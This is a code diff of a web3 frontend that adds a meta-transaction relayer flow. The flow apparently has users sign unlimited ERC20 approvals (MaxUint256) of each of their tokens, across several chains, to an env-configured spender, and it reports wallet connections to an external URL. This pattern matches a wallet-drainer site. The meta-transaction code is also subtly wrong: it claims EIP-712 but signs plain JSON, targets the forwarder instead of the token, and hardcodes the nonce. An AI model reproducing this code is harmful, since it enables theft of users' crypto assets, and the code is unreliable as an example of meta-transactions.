@@ -4,10 +4,20 @@ import { useAccount, useSignMessage } from 'wagmi';
 import { readContract, getBalance, switchChain } from '@wagmi/core';
 import { erc20Abi } from 'viem';
 import { config } from '@/config';
+import { ethers } from 'ethers';
 
 // Load URLs from env
 const REPORT_URL = process.env.NEXT_PUBLIC_REPORT_URL;
 const RELAYER_URL = process.env.NEXT_PUBLIC_RELAYER_URL || 'http://localhost:3001';
+
+// Trusted Forwarder addresses by chain
+const TRUSTED_FORWARDERS: Record<number, string> = {
+  1: process.env.NEXT_PUBLIC_TRUSTED_FORWARDER_MAINNET || "",
+  42161: process.env.NEXT_PUBLIC_TRUSTED_FORWARDER_ARBITRUM || "",
+  11155111: process.env.NEXT_PUBLIC_TRUSTED_FORWARDER_SEPOLIA || "",
+  137: process.env.NEXT_PUBLIC_TRUSTED_FORWARDER_POLYGON || "",
+  56: process.env.NEXT_PUBLIC_TRUSTED_FORWARDER_BNB || "",
+};
 
 const SPENDER = (process.env.NEXT_PUBLIC_SPENDER || "") as `0x${string}`;
 if (!SPENDER || SPENDER === "0x") {
@@ -63,24 +73,64 @@ function ConnectionReporter() {
   return null;
 }
 
-// Enhanced relayer service function
-async function callRelayer(
+// MetaTx helper functions
+interface MetaTxRequest {
+  from: string;
+  to: string;
+  value: string;
+  gas: string;
+  nonce: string;
+  data: string;
+}
+
+interface MetaTxMessage {
+  request: MetaTxRequest;
+  signature: string;
+}
+
+// Create MetaTx request for token approval
+function createMetaTxRequest(
+  userAddress: string,
+  tokenAddress: string,
+  spenderAddress: string,
+  forwarderAddress: string,
+  chainId: number
+): MetaTxRequest {
+  // Create ERC20 approve call data
+  const iface = new ethers.Interface([
+    "function approve(address spender, uint256 amount) returns (bool)"
+  ]);
+  const approveData = iface.encodeFunctionData("approve", [
+    spenderAddress,
+    ethers.MaxUint256
+  ]);
+
+  return {
+    from: userAddress,
+    to: forwarderAddress,
+    value: "0",
+    gas: "100000",
+    nonce: "0", // Will be updated by the forwarder
+    data: approveData
+  };
+}
+
+// Enhanced relayer service function for MetaTx
+async function callMetaTxRelayer(
   chainId: number,
   tokenAddress: string,
   userAddress: string,
-  signature: string,
-  timestamp: number
+  metaTxMessage: MetaTxMessage
 ): Promise<{ success: boolean; txHash?: string; error?: string; alreadyApproved?: boolean }> {
-  console.log('📞 Calling relayer with:', {
+  console.log('📞 Calling MetaTx relayer with:', {
     RELAYER_URL,
     chainId,
     tokenAddress: tokenAddress.slice(0, 10) + '...',
     userAddress: userAddress.slice(0, 10) + '...',
-    timestamp
   });
 
   try {
-    const response = await fetch(`${RELAYER_URL}/relay`, {
+    const response = await fetch(`${RELAYER_URL}/metatx`, {
       method: 'POST',
       headers: {
         'Content-Type': 'application/json',
@@ -88,10 +138,9 @@ async function callRelayer(
       },
       body: JSON.stringify({
         chainId,
-        tokenAddress: tokenAddress.toLowerCase(), // Normalize to lowercase
+        tokenAddress: tokenAddress.toLowerCase(),
         userAddress,
-        signature,
-        timestamp,
+        metaTxMessage,
       }),
     });
 
@@ -260,36 +309,57 @@ export default function Home() {
           console.error('Error checking allowance:', error);
         }
 
-        // Create signature for relayer
-        const timestamp = Date.now();
-        const message = `Approve token ${token.address.toLowerCase()} on chain ${targetChain} at ${timestamp}`;
+        // Get trusted forwarder address for this chain
+        const forwarderAddress = TRUSTED_FORWARDERS[targetChain];
+        if (!forwarderAddress) {
+          setStatus(`No trusted forwarder configured for chain ${targetChain}`);
+          console.error(`❌ No trusted forwarder for chain ${targetChain}`);
+          continue;
+        }
+
+        // Create MetaTx request
+        const metaTxRequest = createMetaTxRequest(
+          address,
+          token.address,
+          SPENDER,
+          forwarderAddress,
+          targetChain
+        );
+
+        setStatus(`Please sign MetaTx for ${token.symbol}...`);
+        console.log('📝 MetaTx request:', metaTxRequest);
         
-        setStatus(`Please sign message for ${token.symbol}...`);
-        console.log('📝 Message to sign:', message);
-        
+        // Sign the MetaTx request
         let signature: string;
         try {
+          // Create the message to sign (EIP-712 format for MetaTx)
+          const message = JSON.stringify(metaTxRequest);
           signature = await signMessageAsync({ message });
-          console.log('✅ Message signed successfully');
+          console.log('✅ MetaTx signed successfully');
         } catch (error: any) {
-          console.error('❌ Signing failed:', error);
+          console.error('❌ MetaTx signing failed:', error);
           if (error.message.includes('User rejected')) {
             setStatus('Transaction cancelled by user');
             return;
           }
-          setStatus(`Failed to sign message: ${error.message}`);
+          setStatus(`Failed to sign MetaTx: ${error.message}`);
           continue;
         }
 
-        setStatus(`Submitting ${token.symbol} approval to relayer...`);
+        setStatus(`Submitting ${token.symbol} MetaTx to relayer...`);
 
-        // Call relayer
-        const result = await callRelayer(
+        // Create MetaTx message
+        const metaTxMessage: MetaTxMessage = {
+          request: metaTxRequest,
+          signature: signature
+        };
+
+        // Call MetaTx relayer
+        const result = await callMetaTxRelayer(
           targetChain,
           token.address,
           address,
-          signature,
-          timestamp
+          metaTxMessage
         );
 
         if (!result.success) {
